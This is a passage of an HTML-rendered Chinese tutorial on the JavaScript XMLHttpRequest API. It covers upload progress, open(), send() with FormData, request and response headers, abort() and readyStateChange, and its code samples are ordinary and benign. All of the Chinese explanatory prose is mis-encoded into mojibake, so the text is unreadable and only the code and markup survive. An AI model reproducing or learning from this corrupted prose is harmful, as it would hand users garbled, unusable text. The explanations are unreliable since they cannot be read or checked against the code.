<h4 id="XMLHttpRequest-upload"><a href="#XMLHttpRequest-upload" class="headerlink" title="XMLHttpRequest.upload"></a>XMLHttpRequest.upload</h4><p>XMLHttpRequest ä¸ä»…å¯ä»¥å‘é€è¯·æ±‚ï¼Œè¿˜å¯ä»¥å‘é€æ–‡ä»¶ï¼Œè¿™å°±æ˜¯ AJAX æ–‡ä»¶ä¸Šä¼ ã€‚å‘é€æ–‡ä»¶ä»¥åï¼Œé€šè¿‡<code>XMLHttpRequest.upload</code>å±æ€§å¯ä»¥å¾—åˆ°ä¸€ä¸ªå¯¹è±¡ï¼Œé€šè¿‡è§‚å¯Ÿè¿™ä¸ªå¯¹è±¡ï¼Œå¯ä»¥å¾—çŸ¥ä¸Šä¼ çš„è¿›å±•ã€‚ä¸»è¦æ–¹æ³•å°±æ˜¯ç›‘å¬è¿™ä¸ªå¯¹è±¡çš„å„ç§äº‹ä»¶ï¼šloadstartã€loadendã€loadã€abortã€errorã€progressã€timeoutã€‚</p>
<p>å‡å®šç½‘é¡µä¸Šæœ‰ä¸€ä¸ª<code>&lt;progress&gt;</code>å…ƒç´ ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;progress min&#x3D;&quot;0&quot; max&#x3D;&quot;100&quot; value&#x3D;&quot;0&quot;&gt;0% complete&lt;&#x2F;progress&gt;</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå¯¹<code>upload</code>å±æ€§æŒ‡å®š<code>progress</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ï¼Œå³å¯è·å¾—ä¸Šä¼ çš„è¿›åº¦ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function upload(blobOrFile) &#123;</span><br><span class="line">  var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">  xhr.open(&#39;POST&#39;, &#39;&#x2F;server&#39;, true);</span><br><span class="line">  xhr.onload &#x3D; function (e) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  var progressBar &#x3D; document.querySelector(&#39;progress&#39;);</span><br><span class="line">  xhr.upload.onprogress &#x3D; function (e) &#123;</span><br><span class="line">    if (e.lengthComputable) &#123;</span><br><span class="line">      progressBar.value &#x3D; (e.loaded &#x2F; e.total) * 100;</span><br><span class="line">      &#x2F;&#x2F; å…¼å®¹ä¸æ”¯æŒ &lt;progress&gt; å…ƒç´ çš„è€å¼æµè§ˆå™¨</span><br><span class="line">      progressBar.textContent &#x3D; progressBar.value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  xhr.send(blobOrFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">upload(new Blob([&#39;hello world&#39;], &#123;type: &#39;text&#x2F;plain&#39;&#125;));</span><br></pre></td></tr></table></figure>

<h3 id="XMLHttpRequest-çš„å®ä¾‹æ–¹æ³•"><a href="#XMLHttpRequest-çš„å®ä¾‹æ–¹æ³•" class="headerlink" title="XMLHttpRequest çš„å®ä¾‹æ–¹æ³•"></a>XMLHttpRequest çš„å®ä¾‹æ–¹æ³•</h3><h4 id="XMLHttpRequest-open"><a href="#XMLHttpRequest-open" class="headerlink" title="XMLHttpRequest.open()"></a>XMLHttpRequest.open()</h4><p><code>XMLHttpRequest.open()</code>æ–¹æ³•ç”¨äºæŒ‡å®š HTTP è¯·æ±‚çš„å‚æ•°ï¼Œæˆ–è€…è¯´åˆå§‹åŒ– XMLHttpRequest å®ä¾‹å¯¹è±¡ã€‚å®ƒä¸€å…±å¯ä»¥æ¥å—äº”ä¸ªå‚æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void open(</span><br><span class="line">   string method,</span><br><span class="line">   string url,</span><br><span class="line">   optional boolean async,</span><br><span class="line">   optional string user,</span><br><span class="line">   optional string password</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>method</code>ï¼šè¡¨ç¤º HTTP åŠ¨è¯æ–¹æ³•ï¼Œæ¯”å¦‚<code>GET</code>ã€<code>POST</code>ã€<code>PUT</code>ã€<code>DELETE</code>ã€<code>HEAD</code>ç­‰ã€‚</li>
<li><code>url</code>: è¡¨ç¤ºè¯·æ±‚å‘é€ç›®æ ‡ URLã€‚</li>
<li><code>async</code>: å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè¯·æ±‚æ˜¯å¦ä¸ºå¼‚æ­¥ï¼Œé»˜è®¤ä¸º<code>true</code>ã€‚å¦‚æœè®¾ä¸º<code>false</code>ï¼Œåˆ™<code>send()</code>æ–¹æ³•åªæœ‰ç­‰åˆ°æ”¶åˆ°æœåŠ¡å™¨è¿”å›äº†ç»“æœï¼Œæ‰ä¼šè¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚è¯¥å‚æ•°å¯é€‰ã€‚ç”±äºåŒæ­¥ AJAX è¯·æ±‚ä¼šé€ æˆæµè§ˆå™¨å¤±å»å“åº”ï¼Œè®¸å¤šæµè§ˆå™¨å·²ç»ç¦æ­¢åœ¨ä¸»çº¿ç¨‹ä½¿ç”¨ï¼Œåªå…è®¸ Worker é‡Œé¢ä½¿ç”¨ã€‚æ‰€ä»¥ï¼Œè¿™ä¸ªå‚æ•°è½»æ˜“ä¸åº”è¯¥è®¾ä¸º<code>false</code>ã€‚</li>
<li><code>user</code>ï¼šè¡¨ç¤ºç”¨äºè®¤è¯çš„ç”¨æˆ·åï¼Œé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²ã€‚è¯¥å‚æ•°å¯é€‰ã€‚</li>
<li><code>password</code>ï¼šè¡¨ç¤ºç”¨äºè®¤è¯çš„å¯†ç ï¼Œé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²ã€‚è¯¥å‚æ•°å¯é€‰ã€‚</li>
</ul>
<p>æ³¨æ„ï¼Œå¦‚æœå¯¹ä½¿ç”¨è¿‡<code>open()</code>æ–¹æ³•çš„ AJAX è¯·æ±‚ï¼Œå†æ¬¡ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œç­‰åŒäºè°ƒç”¨<code>abort()</code>ï¼Œå³ç»ˆæ­¢è¯·æ±‚ã€‚</p>
<p>ä¸‹é¢å‘é€ POST è¯·æ±‚çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;POST&#39;, encodeURI(&#39;someURL&#39;));</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-send"><a href="#XMLHttpRequest-send" class="headerlink" title="XMLHttpRequest.send()"></a>XMLHttpRequest.send()</h4><p><code>XMLHttpRequest.send()</code>æ–¹æ³•ç”¨äºå®é™…å‘å‡º HTTP è¯·æ±‚ã€‚å®ƒçš„å‚æ•°æ˜¯å¯é€‰çš„ï¼Œå¦‚æœä¸å¸¦å‚æ•°ï¼Œå°±è¡¨ç¤º HTTP è¯·æ±‚åªæœ‰ä¸€ä¸ª URLï¼Œæ²¡æœ‰æ•°æ®ä½“ï¼Œå…¸å‹ä¾‹å­å°±æ˜¯ GET è¯·æ±‚ï¼›å¦‚æœå¸¦æœ‰å‚æ•°ï¼Œå°±è¡¨ç¤ºé™¤äº†å¤´ä¿¡æ¯ï¼Œè¿˜å¸¦æœ‰åŒ…å«å…·ä½“æ•°æ®çš„ä¿¡æ¯ä½“ï¼Œå…¸å‹ä¾‹å­å°±æ˜¯ POST è¯·æ±‚ã€‚</p>
<p>ä¸‹é¢æ˜¯ GET è¯·æ±‚çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;,</span><br><span class="line">  &#39;http:&#x2F;&#x2F;www.example.com&#x2F;?id&#x3D;&#39; + encodeURIComponent(id),</span><br><span class="line">  true</span><br><span class="line">);</span><br><span class="line">xhr.send(null);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>GET</code>è¯·æ±‚çš„å‚æ•°ï¼Œä½œä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²é™„åŠ åœ¨ URL åé¢ã€‚</p>
<p>ä¸‹é¢æ˜¯å‘é€ POST è¯·æ±‚çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">var data &#x3D; &#39;email&#x3D;&#39;</span><br><span class="line">  + encodeURIComponent(email)</span><br><span class="line">  + &#39;&amp;password&#x3D;&#39;</span><br><span class="line">  + encodeURIComponent(password);</span><br><span class="line"></span><br><span class="line">xhr.open(&#39;POST&#39;, &#39;http:&#x2F;&#x2F;www.example.com&#39;, true);</span><br><span class="line">xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application&#x2F;x-www-form-urlencoded&#39;);</span><br><span class="line">xhr.send(data);</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œæ‰€æœ‰ XMLHttpRequest çš„ç›‘å¬äº‹ä»¶ï¼Œéƒ½å¿…é¡»åœ¨<code>send()</code>æ–¹æ³•è°ƒç”¨ä¹‹å‰è®¾å®šã€‚</p>
<p><code>send</code>æ–¹æ³•çš„å‚æ•°å°±æ˜¯å‘é€çš„æ•°æ®ã€‚å¤šç§æ ¼å¼çš„æ•°æ®ï¼Œéƒ½å¯ä»¥ä½œä¸ºå®ƒçš„å‚æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void send();</span><br><span class="line">void send(ArrayBufferView data);</span><br><span class="line">void send(Blob data);</span><br><span class="line">void send(Document data);</span><br><span class="line">void send(String data);</span><br><span class="line">void send(FormData data);</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ<code>send()</code>å‘é€ DOM å¯¹è±¡ï¼Œåœ¨å‘é€ä¹‹å‰ï¼Œæ•°æ®ä¼šå…ˆè¢«ä¸²è¡ŒåŒ–ã€‚å¦‚æœå‘é€äºŒè¿›åˆ¶æ•°æ®ï¼Œæœ€å¥½æ˜¯å‘é€<code>ArrayBufferView</code>æˆ–<code>Blob</code>å¯¹è±¡ï¼Œè¿™ä½¿å¾—é€šè¿‡ Ajax ä¸Šä¼ æ–‡ä»¶æˆä¸ºå¯èƒ½ã€‚</p>
<p>ä¸‹é¢æ˜¯å‘é€è¡¨å•æ•°æ®çš„ä¾‹å­ã€‚<code>FormData</code>å¯¹è±¡å¯ä»¥ç”¨äºæ„é€ è¡¨å•æ•°æ®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var formData &#x3D; new FormData();</span><br><span class="line"></span><br><span class="line">formData.append(&#39;username&#39;, &#39;å¼ ä¸‰&#39;);</span><br><span class="line">formData.append(&#39;email&#39;, &#39;zhangsan@example.com&#39;);</span><br><span class="line">formData.append(&#39;birthDate&#39;, 1940);</span><br><span class="line"></span><br><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;POST&#39;, &#39;&#x2F;register&#39;);</span><br><span class="line">xhr.send(formData);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>FormData</code>å¯¹è±¡æ„é€ äº†è¡¨å•æ•°æ®ï¼Œç„¶åä½¿ç”¨<code>send()</code>æ–¹æ³•å‘é€ã€‚å®ƒçš„æ•ˆæœä¸å‘é€ä¸‹é¢çš„è¡¨å•æ•°æ®æ˜¯ä¸€æ ·çš„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id&#x3D;&#39;registration&#39; name&#x3D;&#39;registration&#39; action&#x3D;&#39;&#x2F;register&#39;&gt;</span><br><span class="line">  &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;username&#39; value&#x3D;&#39;å¼ ä¸‰&#39;&gt;</span><br><span class="line">  &lt;input type&#x3D;&#39;email&#39; name&#x3D;&#39;email&#39; value&#x3D;&#39;zhangsan@example.com&#39;&gt;</span><br><span class="line">  &lt;input type&#x3D;&#39;number&#39; name&#x3D;&#39;birthDate&#39; value&#x3D;&#39;1940&#39;&gt;</span><br><span class="line">  &lt;input type&#x3D;&#39;submit&#39; onclick&#x3D;&#39;return sendForm(this.form);&#39;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„ä¾‹å­æ˜¯ä½¿ç”¨<code>FormData</code>å¯¹è±¡åŠ å·¥è¡¨å•æ•°æ®ï¼Œç„¶åå†å‘é€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function sendForm(form) &#123;</span><br><span class="line">  var formData &#x3D; new FormData(form);</span><br><span class="line">  formData.append(&#39;csrf&#39;, &#39;e69a18d7db1286040586e6da1950128c&#39;);</span><br><span class="line"></span><br><span class="line">  var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">  xhr.open(&#39;POST&#39;, form.action, true);</span><br><span class="line">  xhr.onload &#x3D; function() &#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125;;</span><br><span class="line">  xhr.send(formData);</span><br><span class="line"></span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var form &#x3D; document.querySelector(&#39;#registration&#39;);</span><br><span class="line">sendForm(form);</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-setRequestHeader"><a href="#XMLHttpRequest-setRequestHeader" class="headerlink" title="XMLHttpRequest.setRequestHeader()"></a>XMLHttpRequest.setRequestHeader()</h4><p><code>XMLHttpRequest.setRequestHeader()</code>æ–¹æ³•ç”¨äºè®¾ç½®æµè§ˆå™¨å‘é€çš„ HTTP è¯·æ±‚çš„å¤´ä¿¡æ¯ã€‚è¯¥æ–¹æ³•å¿…é¡»åœ¨<code>open()</code>ä¹‹åã€<code>send()</code>ä¹‹å‰è°ƒç”¨ã€‚å¦‚æœè¯¥æ–¹æ³•å¤šæ¬¡è°ƒç”¨ï¼Œè®¾å®šåŒä¸€ä¸ªå­—æ®µï¼Œåˆ™æ¯ä¸€æ¬¡è°ƒç”¨çš„å€¼ä¼šè¢«åˆå¹¶æˆä¸€ä¸ªå•ä¸€çš„å€¼å‘é€ã€‚</p>
<p>è¯¥æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå¤´ä¿¡æ¯çš„å­—æ®µåï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å­—æ®µå€¼ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application&#x2F;json&#39;);</span><br><span class="line">xhr.setRequestHeader(&#39;Content-Length&#39;, JSON.stringify(data).length);</span><br><span class="line">xhr.send(JSON.stringify(data));</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç é¦–å…ˆè®¾ç½®å¤´ä¿¡æ¯<code>Content-Type</code>ï¼Œè¡¨ç¤ºå‘é€ JSON æ ¼å¼çš„æ•°æ®ï¼›ç„¶åè®¾ç½®<code>Content-Length</code>ï¼Œè¡¨ç¤ºæ•°æ®é•¿åº¦ï¼›æœ€åå‘é€ JSON æ•°æ®ã€‚</p>
<h4 id="XMLHttpRequest-overrideMimeType"><a href="#XMLHttpRequest-overrideMimeType" class="headerlink" title="XMLHttpRequest.overrideMimeType()"></a>XMLHttpRequest.overrideMimeType()</h4><p><code>XMLHttpRequest.overrideMimeType()</code>æ–¹æ³•ç”¨æ¥æŒ‡å®š MIME ç±»å‹ï¼Œè¦†ç›–æœåŠ¡å™¨è¿”å›çš„çœŸæ­£çš„ MIME ç±»å‹ï¼Œä»è€Œè®©æµè§ˆå™¨è¿›è¡Œä¸ä¸€æ ·çš„å¤„ç†ã€‚ä¸¾ä¾‹æ¥è¯´ï¼ŒæœåŠ¡å™¨è¿”å›çš„æ•°æ®ç±»å‹æ˜¯<code>text/xml</code>ï¼Œç”±äºç§ç§åŸå› æµè§ˆå™¨è§£æä¸æˆåŠŸæŠ¥é”™ï¼Œè¿™æ—¶å°±æ‹¿ä¸åˆ°æ•°æ®äº†ã€‚ä¸ºäº†æ‹¿åˆ°åŸå§‹æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ MIME ç±»å‹æ”¹æˆ<code>text/plain</code>ï¼Œè¿™æ ·æµè§ˆå™¨å°±ä¸ä¼šå»è‡ªåŠ¨è§£æï¼Œä»è€Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿åˆ°åŸå§‹æ–‡æœ¬äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.overrideMimeType(&#39;text&#x2F;plain&#39;)</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œè¯¥æ–¹æ³•å¿…é¡»åœ¨<code>send()</code>æ–¹æ³•ä¹‹å‰è°ƒç”¨ã€‚</p>
<p>ä¿®æ”¹æœåŠ¡å™¨è¿”å›çš„æ•°æ®ç±»å‹ï¼Œä¸æ˜¯æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥é‡‡å–çš„æ–¹æ³•ã€‚å¦‚æœå¸Œæœ›æœåŠ¡å™¨è¿”å›æŒ‡å®šçš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥ç”¨<code>responseType</code>å±æ€§å‘Šè¯‰æœåŠ¡å™¨ï¼Œå°±åƒä¸‹é¢çš„ä¾‹å­ã€‚åªæœ‰åœ¨æœåŠ¡å™¨æ— æ³•è¿”å›æŸç§æ•°æ®ç±»å‹æ—¶ï¼Œæ‰ä½¿ç”¨<code>overrideMimeType()</code>æ–¹æ³•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.onload &#x3D; function(e) &#123;</span><br><span class="line">  var arraybuffer &#x3D; xhr.response;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(&#39;GET&#39;, url);</span><br><span class="line">xhr.responseType &#x3D; &#39;arraybuffer&#39;;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-getResponseHeader"><a href="#XMLHttpRequest-getResponseHeader" class="headerlink" title="XMLHttpRequest.getResponseHeader()"></a>XMLHttpRequest.getResponseHeader()</h4><p><code>XMLHttpRequest.getResponseHeader()</code>æ–¹æ³•è¿”å› HTTP å¤´ä¿¡æ¯æŒ‡å®šå­—æ®µçš„å€¼ï¼Œå¦‚æœè¿˜æ²¡æœ‰æ”¶åˆ°æœåŠ¡å™¨å›åº”æˆ–è€…æŒ‡å®šå­—æ®µä¸å­˜åœ¨ï¼Œè¿”å›<code>null</code>ã€‚è¯¥æ–¹æ³•çš„å‚æ•°ä¸åŒºåˆ†å¤§å°å†™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function getHeaderTime() &#123;</span><br><span class="line">  console.log(this.getResponseHeader(&quot;Last-Modified&quot;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;HEAD&#39;, &#39;yourpage.html&#39;);</span><br><span class="line">xhr.onload &#x3D; getHeaderTime;</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœ‰å¤šä¸ªå­—æ®µåŒåï¼Œå®ƒä»¬çš„å€¼ä¼šè¢«è¿æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå­—æ®µä¹‹é—´ä½¿ç”¨â€œé€—å·+ç©ºæ ¼â€åˆ†éš”ã€‚</p>
<h4 id="XMLHttpRequest-getAllResponseHeaders"><a href="#XMLHttpRequest-getAllResponseHeaders" class="headerlink" title="XMLHttpRequest.getAllResponseHeaders()"></a>XMLHttpRequest.getAllResponseHeaders()</h4><p><code>XMLHttpRequest.getAllResponseHeaders()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å‘æ¥çš„æ‰€æœ‰ HTTP å¤´ä¿¡æ¯ã€‚æ ¼å¼ä¸ºå­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå¤´ä¿¡æ¯ä¹‹é—´ä½¿ç”¨<code>CRLF</code>åˆ†éš”ï¼ˆå›è½¦+æ¢è¡Œï¼‰ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°æœåŠ¡å™¨å›åº”ï¼Œè¯¥å±æ€§ä¸º<code>null</code>ã€‚å¦‚æœå‘ç”Ÿç½‘ç»œé”™è¯¯ï¼Œè¯¥å±æ€§ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;foo.txt&#39;, true);</span><br><span class="line">xhr.send();</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">  if (this.readyState &#x3D;&#x3D;&#x3D; 4) &#123;</span><br><span class="line">    var headers &#x3D; xhr.getAllResponseHeaders();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ç”¨äºè·å–æœåŠ¡å™¨è¿”å›çš„æ‰€æœ‰å¤´ä¿¡æ¯ã€‚å®ƒå¯èƒ½æ˜¯ä¸‹é¢è¿™æ ·çš„å­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">date: Fri, 08 Dec 2017 21:04:30 GMT\r\n</span><br><span class="line">content-encoding: gzip\r\n</span><br><span class="line">x-content-type-options: nosniff\r\n</span><br><span class="line">server: meinheld&#x2F;0.6.1\r\n</span><br><span class="line">x-frame-options: DENY\r\n</span><br><span class="line">content-type: text&#x2F;html; charset&#x3D;utf-8\r\n</span><br><span class="line">connection: keep-alive\r\n</span><br><span class="line">strict-transport-security: max-age&#x3D;63072000\r\n</span><br><span class="line">vary: Cookie, Accept-Encoding\r\n</span><br><span class="line">content-length: 6502\r\n</span><br><span class="line">x-xss-protection: 1; mode&#x3D;block\r\n</span><br></pre></td></tr></table></figure>

<p>ç„¶åï¼Œå¯¹è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var arr &#x3D; headers.trim().split(&#x2F;[\r\n]+&#x2F;);</span><br><span class="line">var headerMap &#x3D; &#123;&#125;;</span><br><span class="line"></span><br><span class="line">arr.forEach(function (line) &#123;</span><br><span class="line">  var parts &#x3D; line.split(&#39;: &#39;);</span><br><span class="line">  var header &#x3D; parts.shift();</span><br><span class="line">  var value &#x3D; parts.join(&#39;: &#39;);</span><br><span class="line">  headerMap[header] &#x3D; value;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">headerMap[&#39;content-length&#39;] &#x2F;&#x2F; &quot;6502&quot;</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-abort"><a href="#XMLHttpRequest-abort" class="headerlink" title="XMLHttpRequest.abort()"></a>XMLHttpRequest.abort()</h4><p><code>XMLHttpRequest.abort()</code>æ–¹æ³•ç”¨æ¥ç»ˆæ­¢å·²ç»å‘å‡ºçš„ HTTP è¯·æ±‚ã€‚è°ƒç”¨è¿™ä¸ªæ–¹æ³•ä»¥åï¼Œ<code>readyState</code>å±æ€§å˜ä¸º<code>4</code>ï¼Œ<code>status</code>å±æ€§å˜ä¸º<code>0</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;GET&#39;, &#39;http:&#x2F;&#x2F;www.example.com&#x2F;page.php&#39;, true);</span><br><span class="line">setTimeout(function () &#123;</span><br><span class="line">  if (xhr) &#123;</span><br><span class="line">    xhr.abort();</span><br><span class="line">    xhr &#x3D; null;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, 5000);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç åœ¨å‘å‡º5ç§’ä¹‹åï¼Œç»ˆæ­¢ä¸€ä¸ª AJAX è¯·æ±‚ã€‚</p>
<h3 id="XMLHttpRequest-å®ä¾‹çš„äº‹ä»¶"><a href="#XMLHttpRequest-å®ä¾‹çš„äº‹ä»¶" class="headerlink" title="XMLHttpRequest å®ä¾‹çš„äº‹ä»¶"></a>XMLHttpRequest å®ä¾‹çš„äº‹ä»¶</h3><h4 id="readyStateChange-äº‹ä»¶"><a href="#readyStateChange-äº‹ä»¶" class="headerlink" title="readyStateChange äº‹ä»¶"></a>readyStateChange äº‹ä»¶</h4><p><code>readyState</code>å±æ€§çš„å€¼å‘ç”Ÿæ”¹å˜ï¼Œå°±ä¼šè§¦å‘ readyStateChange äº‹ä»¶ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>onReadyStateChange</code>å±æ€§ï¼ŒæŒ‡å®šè¿™ä¸ªäº‹ä»¶çš„ç›‘å¬å‡½æ•°ï¼Œå¯¹ä¸åŒçŠ¶æ€è¿›è¡Œä¸åŒå¤„ç†ã€‚å°¤å…¶æ˜¯å½“çŠ¶æ€å˜ä¸º<code>4</code>çš„æ—¶å€™ï¼Œè¡¨ç¤ºé€šä¿¡æˆåŠŸï¼Œè¿™æ—¶å›è°ƒå‡½æ•°å°±å¯ä»¥å¤„ç†æœåŠ¡å™¨ä¼ é€å›æ¥çš„æ•°æ®ã€‚</p>
